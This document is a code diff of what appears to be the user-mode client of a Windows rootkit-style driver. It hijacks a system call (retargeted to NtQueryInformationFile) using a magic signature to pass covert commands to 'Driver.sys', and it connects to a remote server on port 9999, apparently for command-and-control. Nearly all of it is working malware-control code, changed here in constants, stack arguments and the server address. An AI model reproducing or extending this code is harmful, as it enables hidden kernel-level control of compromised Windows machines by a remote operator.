@@ -8,7 +8,8 @@
 #pragma comment(lib, "Ws2_32.lib")
 
 #define sysenter __asm _emit 0x0F __asm _emit 0x34
-#define SIGNATURE_SYSCALL 0xBAD0FACE
+#define SIGNATURE_SYSCALL 0x00ABBA00
+#define NUMBER_NT_QUERY_INFORMATION_FILE  0x97 //151
 #define DRIVER_NAME "driver"
 #define DRIVER_FILE "Driver.sys"
 
@@ -70,27 +71,29 @@ int main(int argc, char* argv[]) {
 				__asm {
 					push 0
 					push 0
+					push 0
 					lea eax, cmd
 					push eax
 					push SIGNATURE_SYSCALL
-					mov eax, 0x26
+					mov eax, NUMBER_NT_QUERY_INFORMATION_FILE
 				}
 				AddressSystemCall = (unsigned int)FastSystemCall;
 				SysCall();
 			}
 		}
 		// TEST SYSCALL
-		else if (!strcmp(argv[1], "0x26")) {
+		else if (!strcmp(argv[1], "0x97")) {
 			cmd.flags = COMMAND_TEST_COMMAND;
 			cmd.target = NULL;
 			cmd.change = NULL;
 			__asm {
 				push 0
 				push 0
+				push 0
 				lea eax, cmd
 				push eax
 				push SIGNATURE_SYSCALL
-				mov eax, 0x26
+				mov eax, NUMBER_NT_QUERY_INFORMATION_FILE
 			}
 			AddressSystemCall = (unsigned int)FastSystemCall;
 			SysCall();
@@ -108,10 +111,11 @@ int main(int argc, char* argv[]) {
 				__asm {
 					push 0
 					push 0
+					push 0
 					lea eax, cmd
 					push eax
 					push SIGNATURE_SYSCALL
-					mov eax, 0x26
+					mov eax, NUMBER_NT_QUERY_INFORMATION_FILE
 				}
 				AddressSystemCall = (unsigned int)FastSystemCall;
 				SysCall();
@@ -134,10 +138,11 @@ int main(int argc, char* argv[]) {
 				__asm {
 					push 0
 					push 0
+					push 0
 					lea eax, cmd
 					push eax
 					push SIGNATURE_SYSCALL
-					mov eax, 0x26
+					mov eax, NUMBER_NT_QUERY_INFORMATION_FILE
 				}
 				AddressSystemCall = (unsigned int)FastSystemCall;
 				SysCall();
@@ -157,10 +162,11 @@ int main(int argc, char* argv[]) {
 				__asm {
 					push 0
 					push 0
+					push 0
 					lea eax, cmd
 					push eax
 					push SIGNATURE_SYSCALL
-					mov eax, 0x26
+					mov eax, NUMBER_NT_QUERY_INFORMATION_FILE
 				}
 				AddressSystemCall = (unsigned int)FastSystemCall;
 				SysCall();
@@ -183,10 +189,11 @@ int main(int argc, char* argv[]) {
 				__asm {
 					push 0
 					push 0
+					push 0
 					lea eax, cmd
 					push eax
 					push SIGNATURE_SYSCALL
-					mov eax, 0x26
+					mov eax, NUMBER_NT_QUERY_INFORMATION_FILE
 				}
 				AddressSystemCall = (unsigned int)FastSystemCall;
 				SysCall();
@@ -207,10 +214,11 @@ int main(int argc, char* argv[]) {
 				__asm {
 					push 0
 					push 0
+					push 0
 					lea eax, cmd
 					push eax
 					push SIGNATURE_SYSCALL
-					mov eax, 0x26
+					mov eax, NUMBER_NT_QUERY_INFORMATION_FILE
 				}
 				AddressSystemCall = (unsigned int)FastSystemCall;
 				SysCall();
@@ -229,10 +237,11 @@ int main(int argc, char* argv[]) {
 				__asm {
 					push 0
 					push 0
+					push 0
 					lea eax, cmd
 					push eax
 					push SIGNATURE_SYSCALL
-					mov eax, 0x26
+					mov eax, NUMBER_NT_QUERY_INFORMATION_FILE
 				}
 				AddressSystemCall = (unsigned int)FastSystemCall;
 				SysCall();
@@ -283,7 +292,7 @@ int ConnectToServer() {
 	}
 	printf("Socket created. Connecting...\n");
 	memset(&server, 0, sizeof server);
-	server.sin_addr.s_addr = inet_addr("192.168.91.1");
+	server.sin_addr.s_addr = inet_addr("192.168.222.1");
 	server.sin_family = AF_INET;
 	server.sin_port = htons(9999);
 
@@ -360,8 +369,8 @@ int GetCommand(const char* payload_string, PCOMMAND payload, int* has_result) {
 	memcpy(first_command, payload_string, len_of_command);
 	first_command[len_of_command] = 0;
 
-	if (!strcmp(first_command, "0x26")) {
-		printf("test 0x26\n");
+	if (!strcmp(first_command, "NUMBER_NT_QUERY_INFORMATION_FILE")) {
+		printf("test NUMBER_NT_QUERY_INFORMATION_FILE\n");
 		payload_string = payload_string + len_of_command + 1;
 		GetTestCommand(payload_string, payload);
 		goto end_label;
